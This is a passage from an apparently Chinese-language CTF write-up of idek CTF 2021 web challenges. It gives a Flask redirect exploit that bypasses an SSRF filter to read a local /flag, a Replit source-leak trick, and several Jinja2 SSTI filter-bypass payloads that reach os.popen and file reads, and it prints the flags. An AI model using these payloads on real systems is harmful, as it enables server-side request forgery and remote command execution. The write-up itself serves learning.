&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#75af00">url1&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;string&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#75af00">url2&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;string&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid format received&amp;#39;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">urls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">url1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">url2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">valid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">validifyURL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`Request to &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> was denied`&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">difference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">diffURLs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;diff&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">lines&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">difference&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`App listening at http://localhost:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°å¯¹è¯·æ±‚çš„urlç”¨&lt;code>ssrfFilter&lt;/code>è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸è®¿é—®æœ¬åœ°çš„&lt;code>/flag&lt;/code>ï¼Œä½†æ˜¯è¦flagå°±å¿…é¡»è¦ssrfï¼Œè¿™é‡ŒNodeçš„ç‰ˆæœ¬æ˜¯alpineï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œhttpè¯·æ±‚åˆ‡åˆ†&lt;/p>
&lt;p>äºŽæ˜¯æˆ‘å°è¯•æž„é€ ä¸€ä¸ªæ¶æ„htmlé¡µé¢åŒ…å«ä¸€ä¸ªè·³è½¬çš„jsè„šæœ¬ï¼Œä½†æ˜¯å­¦è‰ºä¸ç²¾ æž„é€ å¤±è´¥äº†ï¼›éšåŽæˆ‘åˆå°è¯•äº†DNSé‡ç»‘å®šï¼Œä½†æ˜¯ä¼šè¢«æ£€æµ‹å‡ºæ¥å¯¼è‡´åˆ©ç”¨å¤±è´¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132823135.png" alt="image-20211213132823135">&lt;/p>
&lt;p>åŽæ¥çœ‹äº†discordä¸­çš„è§£ç­”&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211215212432931.png" alt="image-20211215212432931">&lt;/p>
&lt;p>æ‰€ä»¥è¯´é‡ç»‘å®šè¿˜æ˜¯å¯è¡Œçš„ï¼Œå› ä¸ºåœ¨ä¸€ä¸ªåŸŸåè¢«åå¤æ¨ªè·³åœ°è§£æžipåœ°å€ï¼Œå¦‚æžœç¬¬ä¸€æ¬¡è¢«è§£æžä¸ºæˆ‘ä»¬æœåŠ¡å™¨åœ°åœ°å€è€Œç¬¬äºŒæ¬¡è¿”å›ž127.0.0.1å°±å¯ä»¥è¾¾åˆ°SSRFåœ°æ•ˆæžœäº†ï¼›ä¸è¿‡çœ‹wpä¹‹åŽå‘çŽ°ç›´æŽ¥ç”¨pythonä¼šæ›´ç®€å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">threading&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Thread&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">local_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://yourvps_ip:port/&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">reqCounter&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;hey&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">-=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:1337/flag&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start_server&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">send_payload&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://difference-check.chal.idek.team/diff&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;url1&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">local_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;url2&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">start_server&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">send_payload&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132943376.png" alt="image-20211213132943376">&lt;/p>
&lt;p>&lt;code>idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}&lt;/code>&lt;/p>
&lt;p>ä½¿ç”¨é‡å®šå‘çš„æ–¹å¼ï¼Œé¿å¼€ssrfFilterçš„è¿‡æ»¤ï¼Œå­¦åˆ°äº†&lt;/p>
&lt;h2 id="sourceless-guessy-web">Sourceless Guessy Web&lt;/h2>
&lt;blockquote>
&lt;p>&amp;ldquo;If it has a website its web&amp;rdquo;&lt;/p>
&lt;p>&lt;a href="https://sgw.chal.imaginaryctf.org/">https://sgw.chal.imaginaryctf.org/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>é¦–é¡µä¸Šæ²¡ä¸œè¥¿ï¼Œå°±ä¸¤è¡Œå­—&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212015231115.png" alt="image-20211212015231115">&lt;/p>
&lt;p>è€Œä¸”ä¹Ÿä¸èƒ½çˆ†ç ´ï¼Œå°è¯•äº†ç»å…¸è·¯ç”±éƒ½æ²¡ä»€ä¹ˆååº”ï¼Œçœ‹å®¡æŸ¥å…ƒç´ &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213135213779.png" alt="image-20211213135213779">&lt;/p>
&lt;p>æŠ“åŒ…ä¼šçœ‹åˆ°å“åº”å¤´ä¸€ç›´å¸¦ç€&lt;code>report-uri=&amp;quot;https://sentry.repl.it/api/10/security/?sentry_key=xxxx&lt;/code>è¿™æ ·çš„ä¸œè¥¿ï¼Œè®¿é—®&lt;code>https://sgw.chal.imaginaryctf.org/__repl&lt;/code>å°±ä¼šçœ‹åˆ°æºç äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213234458242.png" alt="image-20211213234458242">&lt;/p>
&lt;p>&lt;code>idek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}&lt;/code>&lt;/p>
&lt;h2 id="jinjailbaby-jinjail">JinJail&amp;amp;Baby JinJail&lt;/h2>
&lt;blockquote>
&lt;p>I&amp;rsquo;ve looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?&lt;/p>
&lt;p>&lt;a href="http://jinjail.chal.idek.team">http://jinjail.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip">https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>Jinjail was a bit harder than anticipated, so here&amp;rsquo;s a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!&lt;/p>
&lt;p>&lt;a href="http://baby-jinjail.chal.idek.team">http://baby-jinjail.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip">https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213165127940.png" alt="image-20211213165127940">&lt;/p>
&lt;p>ï¼ˆè¿™ä¸ªå›¾é‡Œæ³¨é‡Šæœ‰ä¸€äº›ä¸å¯¹çš„åœ°æ–¹ æ‡’å¾—æ”¹äº†&lt;/p>
&lt;p>æž„é€ å¡åˆ°æˆ‘çš„åœ°æ–¹æ˜¯ç¦ç”¨äº†å•åŒå¼•å·ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿‡æ»¤å¼•å·å¯ä»¥ä½¿ç”¨&lt;code>chr()&lt;/code>æ¥è¡¨ç¤ºå­—ç¬¦ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æœ‰éœ€è¦ç”¨åˆ°æ•°å­—ï¼›æˆ‘ä»¬çŽ°åœ¨éœ€è¦çš„æ˜¯ä¸€ä¸ªçº¯å­—æ¯çš„SSTI payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># official payload&lt;/span>
&lt;span style="color:#111">{{&lt;/span>&lt;span style="color:#111">lipsum&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]][(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]][(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]]([(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cat&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">center&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">galf&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">reverse&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">)[(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">daer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">reverse&lt;/span>&lt;span style="color:#111">]()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>lipsum&lt;/code>è·Ÿ&lt;code>url_for&lt;/code>, &lt;code>get_flashed_messages&lt;/code>ä¸€æ ·æ˜¯ä¸€ä¸ªåœ¨flaskä¸­çš„å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚&lt;code>url_for&lt;/code>å¯ä»¥è¿™æ ·ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºŽå…³é”®å­—çš„è¿‡æ»¤ä½¿ç”¨äº†&lt;code>(dict()|list)[False]&lt;/code>çš„æ–¹å¼è¿›è¡Œä¸€ä¸ªç»•è¿‡ï¼Œä½†æ˜¯è¯´å®žè¯æˆ‘å¹¶ä¸æ¸…æ¥šè¿™ä¸ª&lt;code>False&lt;/code>çš„ç”¨æ„æ˜¯ä»€ä¹ˆï¼Œå¦‚æžœä¸å¸¦&lt;code>False&lt;/code>æˆ–ç”¨äº†&lt;code>True&lt;/code>è¿”å›žçš„ç»“æžœéƒ½æ˜¯ç©ºçš„ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰æŸ¥åˆ°ç›¸å…³çš„èµ„æ–™ï¼ˆå¦‚æžœæœ‰å¸¦å¸ˆå‚…çœ‹åˆ°äº†è¯·åŠ¡å¿…æŒ‡æ•™ï¼ï¼ï¼&lt;/p>
&lt;p>è¿˜æœ‰ä»Ždiscordé‡Œçœ‹åˆ°çš„å…¶å®ƒç‰ˆæœ¬çš„payloadï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº†å„ç§å„æ ·çš„è¿‡æ»¤å™¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__cl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ass__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__subcl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">asses__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">]()[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">gc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">aaaaaaaaaaaaaaaaaa&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">))]()[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">fl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">]()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœæ­é…ä¸Š&lt;code>dict()&lt;/code>è¿™æ ·çš„ç”¨æ³•ä¹Ÿæ˜¯å¯ä»¥æŽ¥&lt;code>|attr()&lt;/code>çš„ï¼Œä¸Šé¢æˆ‘å†™çš„æ³¨é‡Šå¹¶æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘çš„ï¼ˆå› ä¸ºåšé¢˜çš„æ—¶å€™è¿˜ä¸æ¸…æ¥šè¿™äº›å¥‡å¦™çš„è¿‡æ»¤å™¨æ“ä½œï¼Œå­¦åˆ°å’¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{((((&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__subclas&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span 